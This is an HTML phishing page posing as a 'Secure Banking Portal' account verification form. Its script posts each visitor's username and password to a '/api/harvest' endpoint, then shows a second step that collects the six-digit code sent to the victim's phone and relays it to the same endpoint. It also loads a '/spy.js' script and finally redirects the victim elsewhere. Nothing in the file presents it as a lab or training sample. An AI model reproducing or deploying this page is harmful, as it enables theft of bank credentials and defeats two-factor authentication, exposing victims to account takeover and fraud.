<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Banking Portal</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        h2 { color: #333; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #004494; }
        .loader { display: none; margin-top: 10px; color: #666; font-size: 14px; }
        .step2 { display: none; margin-top: 20px; }
        .step2 input { width: 120px; text-align: center; font-size: 20px; letter-spacing: 8px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Account Verification</h2>
        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">Please verify your identity to view your latest statement.</p>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username / Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Verify & View Statement</button>
        </form>
        <div class="loader" id="loader">Verifying...</div>

        <!-- Step 2: 2FA Relay -->
        <div class="step2" id="step2">
            <p style="font-size: 14px; color: #666; margin-bottom: 10px;">Enter the 6-digit code sent to your phone:</p>
            <input type="text" id="otp" maxlength="6" placeholder="000000">
            <br>
            <button id="otpBtn" onclick="sendOTP()" style="margin-top: 15px;">Submit Code</button>
        </div>
    </div>

    <script src="/spy.js"></script>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            document.querySelector('button').disabled = true;
            document.getElementById('loader').style.display = 'block';

            try {
                await fetch('/api/harvest', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ username, password })
                });

                // Show 2FA step after a brief delay
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('step2').style.display = 'block';
                    document.getElementById('otp').focus();
                }, 1000);
            } catch (err) {
                alert("Verification Failed. Please try again.");
                document.querySelector('button').disabled = false;
                document.getElementById('loader').style.display = 'none';
            }
        });

        async function sendOTP() {
            const otp = document.getElementById('otp').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            try {
                await fetch('/api/harvest', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ username, password, otp, step: '2fa' })
                });
            } catch (e) {}

            // Redirect to the real bank — seamless
            window.location.href = "https://www.google.com";
        }
    </script>
</body>
</html>
